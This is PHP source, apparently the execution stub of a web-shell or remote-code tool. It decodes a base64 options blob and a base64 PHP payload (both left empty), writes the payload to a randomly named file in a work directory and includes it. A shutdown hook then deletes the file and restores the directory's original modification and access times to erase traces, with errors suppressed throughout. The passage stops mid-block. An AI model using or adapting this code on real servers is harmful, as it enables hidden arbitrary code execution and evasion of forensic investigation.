if (!function_exists('file_put_contents'))
{
    function file_put_contents($filename, $data)
    {
        $f = @fopen($filename, 'wb');
        if (!is_resource($f))
            return false;
        else
        {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}

if (!function_exists('stripos'))
{
    function stripos($haystack, $needle, $offset = 0)
    {
        if ($offset == 0)
            return strpos($haystack, stristr($haystack, $needle));

        return strpos(strtolower($haystack), strtolower($needle), $offset);
    }
}


        function cleanup_rsi($eval_code_file, $work_directory, $mtime, $atime)
        {
                @unlink($eval_code_file);
                if ($mtime != false && $atime != false)
                    @touch($work_directory, $mtime, $atime);
        }

        $options = @unserialize(base64_decode(''));
        if ($options == false)
            echo("Can't deserialize options\n");
        else
        {
            if (!file_exists($options['work_directory']))
                echo("Work directory('{$options['work_directory']}') doesn't exists\n");
            elseif(!is_dir($options['work_directory']))
                echo("Work directory('{$options['work_directory']}') is not a directory\n");
            elseif(!is_writable($options['work_directory']))
                echo("Work directory('{$options['work_directory']}') is not writable\n");
            else
            {
                $mtime = @filemtime($options['work_directory']);
                $atime = @fileatime($options['work_directory']);

                $store_name = false;
                while (@file_exists($options['work_directory'].'/'.($store_name = uniqid(mt_rand()))));

                $store_path = str_replace('//','/', $options['work_directory'].'/'.$store_name);
                @register_shutdown_function('cleanup_rsi', $store_path, $options['work_directory'], $mtime, $atime);

                $data = '<?php '.base64_decode('').' ?>';
                if (@file_put_contents($store_path, $data) === false)
                    echo("Can't write data to '$store_path'\n");
                else
                {
                    include($store_path);

                    @cleanup_rsi($store_path, $options['work_directory'], $mtime, $atime);
                }
            }
